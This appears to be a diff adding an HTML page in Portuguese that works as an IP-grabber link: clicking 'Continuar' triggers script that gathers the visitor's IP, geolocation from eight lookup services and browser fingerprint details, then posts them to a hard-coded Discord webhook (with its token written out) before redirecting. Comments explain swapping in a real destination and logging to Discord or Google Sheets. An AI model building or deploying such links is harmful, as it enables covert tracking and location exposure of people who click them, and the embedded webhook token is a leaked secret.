@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Link com Registro Automático</title>
+  <style>
+    body {
+      font-family: system-ui, -apple-system, sans-serif;
+      max-width: 720px;
+      margin: 3rem auto;
+      padding: 0 1rem;
+      line-height: 1.6;
+      color: #222;
+    }
+    a.registrar {
+      display: inline-block;
+      background: #2563eb;
+      color: #fff;
+      padding: 0.7rem 1.4rem;
+      border-radius: 6px;
+      text-decoration: none;
+      font-weight: 600;
+    }
+    a.registrar:hover { background: #1d4ed8; }
+    #overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.65);
+      color: #fff;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      font-size: 1.1rem;
+      text-align: center;
+      padding: 1rem;
+    }
+    #overlay.ativo { display: flex; }
+    #debug {
+      margin-top: 2rem;
+      padding: 1rem;
+      background: #f4f4f4;
+      border-radius: 8px;
+      font-family: ui-monospace, monospace;
+      font-size: 0.82rem;
+      white-space: pre-wrap;
+      word-break: break-word;
+      display: none;
+      max-height: 60vh;
+      overflow-y: auto;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Link com Registro Automático</h2>
+  <p>Clique no link abaixo. Ele vai capturar IP + geolocalização + dados do navegador, <strong>registrar</strong> e depois seguir para o destino.</p>
+
+  <!--
+    ⬇️  TROQUE o href pelo destino real (o link para onde o usuário deve ir).
+    Ao clicar, o JavaScript intercepta, registra os dados e só então redireciona.
+  -->
+  <a href="https://example.com/destino" class="registrar" id="linkRegistrar">
+    ▶ Continuar
+  </a>
+
+  <!-- Overlay de "registrando..." -->
+  <div id="overlay"><div>⏳ Registrando informações…</div></div>
+
+  <!-- Área de debug opcional (não vai para o usuário final, é só para você testar) -->
+  <pre id="debug"></pre>
+
+  <script>
+  (() => {
+    'use strict';
+
+    // ============================================================
+    // ⚙️ CONFIGURAÇÃO — edite esta parte
+    // ============================================================
+
+    // 1) Webhook — deixe '' para desativar.
+    //    Exemplos prontos no final do arquivo (Discord, Google Sheets, Formspree).
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1574466348984045689/zbW7GztEbf1VoBVrThIoWwGsvsSTh_K9a2Ln7syWybg4jqw2qXcxR3_pS_U5VCGNWTjs';
+
+    // 2) Se true, mostra o JSON bruto na tela antes de redirecionar (útil pra testar).
+    const MODO_DEBUG = false;
+
+    // 3) Se true, faz download automático de um arquivo .json com os dados.
+    const BAIXAR_JSON = false;
+
+    // 4) Tempo máximo (ms) que o link pode "segurar" o usuário antes de redirecionar,
+    //    caso algum provedor esteja lento.
+    const TEMPO_MAX_REGISTRO = 8000;
+
+    // 5) Timeout de cada provedor individual (ms).
+    const TIMEOUT_PROVEDOR = 5000;
+
+    // ============================================================
+    // PROVEDORES (todos sem chave, com CORS habilitado)
+    // ============================================================
+    const PROVEDORES = [
+      { nome: 'ipapi.co',        url: 'https://ipapi.co/json/' },
+      { nome: 'ipwho.is',        url: 'https://ipwho.is/' },
+      { nome: 'freeipapi.com',   url: 'https://free.freeipapi.com/api/v1/json/' },
+      { nome: 'ipinfo.io',       url: 'https://ipinfo.io/json' },
+      { nome: 'hackmyip.com',    url: 'https://hackmyip.com/api/ip',
+        extrair: j => j.data || j },
+      { nome: 'ipdata.info',     url: 'https://ipdata.info/json/' },
+      { nome: 'geojs.io',        url: 'https://get.geojs.io/v1/ip/geo.json' },
+      { nome: 'ipify (só IP)',   url: 'https://api.ipify.org?format=json' },
+    ];
+
+    // ============================================================
+    // UTILITÁRIOS
+    // ============================================================
+    const overlay  = document.getElementById('overlay');
+    const debugEl  = document.getElementById('debug');
+    const link     = document.getElementById('linkRegistrar');
+
+    function mostrarOverlay()  { overlay.classList.add('ativo'); }
+    function esconderOverlay() { overlay.classList.remove('ativo'); }
+
+    async function fetchComTimeout(url, ms) {
+      const controller = new AbortController();
+      const timer = setTimeout(() => controller.abort(), ms);
+      try {
+        const res = await fetch(url, {
+          headers: { Accept: 'application/json' },
+          signal: controller.signal,
+        });
+        if (!res.ok) throw new Error('HTTP ' + res.status);
+        return await res.json();
+      } finally {
+        clearTimeout(timer);
+      }
+    }
+
+    // Junta os resultados de vários provedores num único objeto,
+    // preservando campos únicos de cada um (prefixa com o nome do provider
+    // quando há conflito, para não perder nada).
+    function mesclarResultados(lista) {
+      const merged = {};
+      for (const { nome, data } of lista) {
+        for (const [k, v] of Object.entries(data)) {
+          if (!(k in merged)) {
+            merged[k] = v;
+          } else if (merged[k] !== v) {
+            merged[nome + '__' + k] = v;
+          }
+        }
+      }
+      return merged;
+    }
+
+    // Dados extras do navegador (não vêm de API, mas são úteis pra log)
+    function dadosDoNavegador() {
+      return {
+        timestamp: new Date().toISOString(),
+        pagina: location.href,
+        referrer: document.referrer || null,
+        userAgent: navigator.userAgent,
+        idioma: navigator.language,
+        idiomas: navigator.languages,
+        plataforma: navigator.platform,
+        fusoHorario: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        tela: { largura: screen.width, altura: screen.height, dpr: window.devicePixelRatio },
+        viewport: { largura: window.innerWidth, altura: window.innerHeight },
+        cookiesHabilitados: navigator.cookieEnabled,
+        online: navigator.onLine,
+        hardwareConcurrency: navigator.hardwareConcurrency || null,
+      };
+    }
+
+    // ============================================================
+    // COLETA EM PARALELO
+    // ============================================================
+    async function coletarTudo() {
+      const promessas = PROVEDORES.map(async (p) => {
+        try {
+          const bruto = await fetchComTimeout(p.url, TIMEOUT_PROVEDOR);
+          const data  = p.extrair ? p.extrair(bruto) : bruto;
+          return { nome: p.nome, data };
+        } catch (err) {
+          return { nome: p.nome, erro: err.message };
+        }
+      });
+
+      const resultados = await Promise.all(promessas);
+
+      const sucesso = resultados.filter(r => !r.erro);
+      const falhas  = resultados.filter(r =>  r.erro).map(r => ({ provedor: r.nome, erro: r.erro }));
+
+      return {
+        dados: {
+          navegador: dadosDoNavegador(),
+          geolocalizacao: mesclarResultados(sucesso),
+          provedoresOk: sucesso.map(r => r.nome),
+          provedoresComErro: falhas,
+        },
+        debug: { resultados },
+      };
+    }
+
+    // ============================================================
+    // REGISTRAR (localStorage + webhook + download opcional)
+    // ============================================================
+    async function registrar(payload) {
+      // 1) localStorage — sempre
+      try {
+        const historico = JSON.parse(localStorage.getItem('historico_acessos') || '[]');
+        historico.push(payload);
+        // mantém apenas os últimos 50 registros
+        while (historico.length > 50) historico.shift();
+        localStorage.setItem('historico_acessos', JSON.stringify(historico));
+      } catch (e) {
+        console.warn('[registro] localStorage falhou:', e);
+      }
+
+      // 2) Webhook
+      if (WEBHOOK_URL) {
+        try {
+          await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+          });
+        } catch (e) {
+          console.warn('[registro] webhook falhou:', e);
+        }
+      }
+
+      // 3) Download .json
+      if (BAIXAR_JSON) {
+        try {
+          const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
+          const url  = URL.createObjectURL(blob);
+          const a    = document.createElement('a');
+          a.href = url;
+          a.download = 'ip-info-' + Date.now() + '.json';
+          document.body.appendChild(a);
+          a.click();
+          a.remove();
+          URL.revokeObjectURL(url);
+        } catch (e) {
+          console.warn('[registro] download falhou:', e);
+        }
+      }
+    }
+
+    // ============================================================
+    // CLIQUE NO LINK
+    // ============================================================
+    link.addEventListener('click', async (event) => {
+      event.preventDefault();          // segura a navegação
+      const destino = link.href;       // guarda o href original
+
+      mostrarOverlay();
+
+      // Garantia: mesmo se tudo travar, redireciona dentro do tempo máximo.
+      const timerSeguranca = setTimeout(() => {
+        window.location.href = destino;
+      }, TEMPO_MAX_REGISTRO);
+
+      try {
+        const { dados, debug } = await coletarTudo();
+
+        if (MODO_DEBUG) {
+          debugEl.textContent = JSON.stringify(dados, null, 2);
+          debugEl.style.display = 'block';
+          console.log('[debug] dados coletados:', debug);
+        }
+
+        await registrar(dados);
+      } catch (err) {
+        console.error('[registro] erro inesperado:', err);
+      } finally {
+        clearTimeout(timerSeguranca);
+        esconderOverlay();
+        window.location.href = destino;   // segue para o destino
+      }
+    });
+
+    // ============================================================
+    // EXEMPLOS DE WEBHOOK (descomente/adapte o que usar)
+    // ============================================================
+
+    /*
+    ─── DISCORD ──────────────────────────────────────────────────
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/SEU_ID/SEU_TOKEN';
+
+    No código acima, no bloco "2) Webhook", troque o fetch por:
+
+      const ip   = payload.geolocalizacao.ip || payload.geolocalizacao.query || '?';
+      const geo  = payload.geolocalizacao;
+      const embeds = [{
+        title: '🌍 Novo acesso',
+        color: 0x2563eb,
+        fields: [
+          { name: 'IP',        value: String(ip),                inline: true },
+          { name: 'Cidade',    value: String(geo.city || geo.cidade || '?'),   inline: true },
+          { name: 'Região',    value: String(geo.region || geo.regiao || '?'), inline: true },
+          { name: 'País',      value: String(geo.country_name || geo.country || '?'), inline: true },
+          { name: 'Fuso',      value: String(geo.timezone || '?'), inline: true },
+          { name: 'Provedor',  value: String(geo.org || geo.asn || '?'), inline: true },
+          { name: 'Navegador', value: payload.navegador.userAgent.slice(0, 200) },
+        ],
+        timestamp: payload.navegador.timestamp,
+      }];
+
+      await fetch(WEBHOOK_URL, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ embeds }),
+      });
+
+    ─── GOOGLE SHEETS (Apps Script) ──────────────────────────────
+    1. Crie uma planilha → Extensões → Apps Script.
+    2. Cole:
+
+      function doPost(e) {
+        const sh = SpreadsheetApp.getActiveSheet();
+        const d  = JSON.parse(e.postData.contents);
+        sh.appendRow([
+          new Date(),
+          JSON.stringify(d.geolocalizacao),
+          d.navegador.userAgent,
+          d.navegador.pagina,
+        ]);
+        return ContentService.createTextOutput('ok');
+      }
+
+    3. Implante como "App da Web" (acesso: qualquer pessoa).
+    4. Copie a URL e coloque em WEBHOOK_URL.
+
+    ─── FORMSPREE / QUALQUER API JSON ────────────────────────────
+    Basta colocar a URL em WEBHOOK_URL; o payload já vai como JSON.
+    */
+  })();
+  </script>
+</body>
+</html>
